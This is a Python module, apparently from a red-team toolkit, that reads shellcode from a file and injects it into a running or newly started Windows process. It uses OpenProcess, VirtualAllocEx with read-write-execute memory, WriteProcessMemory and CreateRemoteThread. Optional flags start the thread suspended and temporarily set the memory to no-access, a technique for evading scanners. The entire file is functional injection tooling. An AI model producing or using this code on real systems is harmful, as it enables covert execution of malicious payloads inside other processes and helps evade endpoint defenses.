import os
import ctypes

from utils.helper import nstate
from utils.helper import CheckFile, GetFileInfo

CATEGORY = 'core'

def register_arguments(parser):
            parser.add_argument('-i', '--input', help='Input file for process injection')
            parser.add_argument('-p', '--process', help='Processname to inject the shellcode')

            grp = parser.add_argument_group('additional')
            grp.add_argument('-r', '--resume-thread', action='store_true', help='Start thread suspended and resume after speciefied time')
            grp.add_argument('-s', '--start', action='store_true', help='If not active, start the process before injection')
            grp.add_argument('-v', '--virtual-protect', action='store_true', help='Deny access on memory for a specified time')

class inject:
    from ctypes import windll
    from ctypes import wintypes
    from urllib import request
    from time import sleep
    import wmi
    import threading

    Author = 'cpu0x00, psycore8'
    Description = 'Inject shellcode to process'
    Version = '2.1.0'
    DisplayName = 'INJECTION'
    delay = 5
    data_size = 0
    hash = ''
    pid = int

    def __init__(self, input_file, process_start, target_process, shellcode, resume_thread=None, virtual_protect=None):
        self.input_file = input_file
        self.process_start = process_start
        self.target_process = target_process
        self.shellcode = shellcode
        self.resume_thread = resume_thread
        self.virtual_protect = virtual_protect

    def msg(self, message_type, ErrorExit=False):
        messages = {
            'pre.head'       : f'{nstate.FormatModuleHeader(self.DisplayName, self.Version)}\n',
            'error.input'    : f'{nstate.s_fail} File {self.input_file} not found or cannot be opened.',    
            'post.done'      : f'{nstate.s_ok} DONE!',
            'proc.input_ok'  : f'{nstate.s_ok} File {self.input_file} loaded\n{nstate.s_ok} Size of shellcode {self.data_size} bytes\n{nstate.s_ok} Hash: {self.hash}',
            'proc.input_try' : f'{nstate.s_note} Try to open file {self.input_file}',
            'proc.try'       : f'{nstate.s_note} Try to execute shellcode',
            'inj.run'        : f'{nstate.s_note} starting {self.target_process}',
            'inj.pid'        : f'{nstate.s_ok} {self.target_process} process id: {self.pid}',
            'inj.handle'     : f'{nstate.s_ok} Opened a Handle to the process',
            'inj.alloc'      : f'{nstate.s_ok} Allocated Memory in the process',
            'inj.write'      : f'{nstate.s_ok} Wrote The shellcode to memory',
            'inj.nacc'       : f'{nstate.s_note} VirtualProtectEx: PAGE_NO_ACCESS',
            'inj.susp'       : f'{nstate.s_note} CreateRemoteThread: START_SUSPENDED',
            'inj.inj_ok'     : f'{nstate.s_ok} Injected the shellcode into the process',
            'inj.rwe'        : f'{nstate.s_note} VirtualProtectEx: PAGE_READWRITE_EXECUTE',
            'inj.rest'       : f'{nstate.s_note} ResumeThread',
            'inj.resume'     : f'{nstate.s_ok} Process resumed'

        }
        print(messages.get(message_type, f'{message_type} - this message type is unknown'))
        if ErrorExit:
            exit()

    def Start_Process(self):
        self.msg('inj.run')
        #print(f'{nstate.OKBLUE} starting {tp}')
        os.system(self.target_process)

    def get_proc_id(self):
        processes = self.wmi.WMI().Win32_Process(name=self.target_process)
        
        self.pid = processes[0].ProcessId
        self.msg('inj.pid')
        #print(f"{nstate.OKGREEN} {self.target_process} process id: {self.pid}")
        
        return int(self.pid)

    def start_injection(self):
        if self.Start_Process:
            s = self.threading.Thread(target=self.Start_Process)
            s.start()
            self.sleep(3)
        kernel32 = self.windll.kernel32
        # constants
        MEM_COMMIT_RESERVE = 0x3000
        PAGE_READWRITE_EXECUTE = 0x40
        PROCESS_ALL_ACCESS = 0x1fffff
        EXECUTE_IMMEDIATLY = 0

        # Function type redefintions
        OpenProcess = kernel32.OpenProcess
        OpenProcess.argtypes = [self.wintypes.DWORD,self.wintypes.BOOL,self.wintypes.DWORD]
        OpenProcess.restype = self.wintypes.HANDLE

        VirtualAllocEx = kernel32.VirtualAllocEx
        VirtualAllocEx.argtypes = [self.wintypes.HANDLE, self.wintypes.LPVOID, ctypes.c_size_t, self.wintypes.DWORD,self.wintypes.DWORD]
        VirtualAllocEx.restype = self.wintypes.LPVOID

        WriteProcessMemory = kernel32.WriteProcessMemory
        WriteProcessMemory.argtypes = [self.wintypes.HANDLE, self.wintypes.LPVOID, self.wintypes.LPCVOID, ctypes.c_size_t, self.wintypes.LPVOID]
        WriteProcessMemory.restype = self.wintypes.BOOL

        CreateRemoteThread = kernel32.CreateRemoteThread
        CreateRemoteThread.argtypes = [self.wintypes.HANDLE, self.wintypes.LPVOID, ctypes.c_size_t, self.wintypes.LPVOID, self.wintypes.LPVOID, self.wintypes.DWORD, self.wintypes.LPDWORD]
        CreateRemoteThread.restype = self.wintypes.HANDLE

        if self.virtual_protect:
            VirtualProtectEx = kernel32.VirtualProtectEx
            VirtualProtectEx.argtypes = [self.wintypes.HANDLE, self.wintypes.LPVOID, ctypes.c_size_t, self.wintypes.DWORD, self.wintypes.PWORD]
            VirtualProtectEx.restype = self.wintypes.BOOL

        if self.resume_thread or self.virtual_protect:
            ResumeThread = kernel32.ResumeThread
            ResumeThread.argtypes = [self.wintypes.HANDLE]
            ResumeThread.restype = self.wintypes.DWORD

        CloseHandle = kernel32.CloseHandle
        CloseHandle.argtypes = [self.wintypes.HANDLE]
        CloseHandle.restype = self.wintypes.BOOL
        process_id = self.get_proc_id()

        phandle = OpenProcess(PROCESS_ALL_ACCESS, False, process_id)
        if phandle:
            self.msg('inj.handle')
            #print(f"{nstate.OKGREEN} Opened a Handle to the process")

        memory = VirtualAllocEx(phandle, None, len(self.shellcode), MEM_COMMIT_RESERVE, PAGE_READWRITE_EXECUTE)
        if memory:
            self.msg('inj.alloc')
           # print(f'{nstate.OKGREEN} Allocated Memory in the process')

        c_null = ctypes.c_int(0)
        writing = WriteProcessMemory(phandle, memory, self.shellcode, len(self.shellcode), ctypes.byref(c_null))
        if writing:
            self.msg('inj.write')
            #print(f'{nstate.OKGREEN} Wrote The shellcode to memory')
        if self.virtual_protect:
            self.msg('inj.nacc')
            #print(f"{nstate.OKBLUE} VirtualProtectEx: PAGE_NO_ACCESS")
            VirtualProtectEx(phandle, None, 0, 0x01, None)

        if self.resume_thread or self.virtual_protect:
            self.msg('inj.susp')
           # print(f"{nstate.OKBLUE} CreateRemoteThread: START_SUSPENDED")
            Injection = CreateRemoteThread(phandle, None, 0, memory, None, 0x00000004, None)
        else:
            Injection = CreateRemoteThread(phandle, None, 0, memory, None, EXECUTE_IMMEDIATLY, None)

        if Injection:
            self.msg('inj.inj_ok')
            #print(f'{nstate.OKGREEN} Injected the shellcode into the process')

        if self.virtual_protect:
            self.msg('inj.rwe')
           # print(f"{nstate.OKBLUE} VirtualProtectEx: PAGE_READWRITE_EXECUTE")
            #self.sleep(self.delay)
            VirtualProtectEx(phandle, None, 0, 0x40, None)

        if self.resume_thread or self.virtual_protect:
            self.sleep(self.delay)
            self.msg('inj.rest')
           # print(f"{nstate.OKBLUE} ResumeThread")
            resume = ResumeThread(Injection)
            if resume:
                self.msg('inj.resume')
                #print(f'{nstate.OKGREEN} Process resumed')

        CloseHandle(phandle)

    def proc_inject():
        return False
    
    def open_file(self):
        try:
            with open(self.input_file, 'rb') as file:
                self.shellcode = file.read()
        except FileNotFoundError:
            return False
    
    def process(self):
        self.msg('pre.head')
        self.msg('proc.input_try')
        if CheckFile(self.input_file):
            self.data_size, self.hash = GetFileInfo(self.input_file)
            self.msg('proc.input_ok')
            self.open_file()
            self.msg('proc.try')
            self.start_injection()
        else:
            self.msg('error.input', True)
        self.msg('post.done')